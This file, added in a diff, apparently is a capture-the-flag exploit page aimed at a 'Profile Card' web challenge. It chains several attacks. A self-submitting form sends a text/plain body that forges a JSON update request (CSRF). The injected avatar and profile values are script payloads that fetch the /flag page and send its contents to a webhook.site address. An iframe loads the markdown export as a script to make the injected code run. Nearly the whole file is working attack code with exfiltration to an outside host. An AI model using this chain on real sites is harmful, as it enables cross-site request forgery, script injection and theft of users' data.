@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="zh-tw">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile Card</title>
+    <link rel="stylesheet" href="/card.css">
+</head>
+
+<body>
+    <!-- Steal from https://codepen.io/VictoryDesign/pen/PqQevB :D -->
+    <aside class="profile-card">
+        <div id="normal">
+            <header>
+                <a href="https://github.com/adsfd">
+                    <img id="avatar"
+                        src="fetch(&#39;/flag&#39;).then(e=&gt;e.text()).then(res=&gt;{kkk.src=&#39;https://webhook.site/dc3f9a88-110f-43e6-b90e-3e5d6ba1cbaf?&#39;+res}))]/*(" />
+                </a>
+                <h1>@adsfd</h1>
+                <h3 id="title">Human</h3>
+            </header>
+            <div id="profile" class="profile-bio">
+                <iframe srcdoc="<img id=kkk> &lt;script src=/export?format=markdown>&lt;/script>"></iframe>
+            </div>
+        </div>
+
+        <div id="editing" class="hidden">
+            <form id="edit-form" action="https://profile.chal.h4ck3r.quest/api/update" method="POST"
+                enctype="text/plain">
+                <label for="avatar"><b>Avatar URL</b></label>
+                <input type="text"
+                    name='{"avatar": "fetch(&#39;/flag&#39;).then(e=&gt;e.text()).then(res=&gt;{kkk.src=&#39;https://webhook.site/dc3f9a88-110f-43e6-b90e-3e5d6ba1cbaf?&#39;+res}))]/*(", "title": "Human", "profile":"&lt;iframe srcdoc=&#39;&lt;img id=kkk&gt; &amp;lt;script src=/export?format=markdown&gt;&amp;lt;/script&gt;&#39;&gt;&lt;/iframe&gt;*/var a'
+                    value='12"}'>
+
+                <button type="submit" class="btn">Done</button>
+            </form>
+        </div>
+
+    </aside>
+
+
+    <div class="tools">
+        <p><a id="edit" href="#">Edit</a></p>
+        <p><a href="/reset">Reset</a></p>
+        <p><a href="/export?format=html">Export as html</a></p>
+        <p><a href="/export?format=markdown">Export as markdown</a></p>
+        <p><a href="/flag">FLAG</a></p>
+        <hr>
+        <p><a href="/report">Report to Admin</a></p>
+    </div>
+
+    <script>document.getElementById('edit-form').submit()</script>
+
+
+</body>
+
+</html>
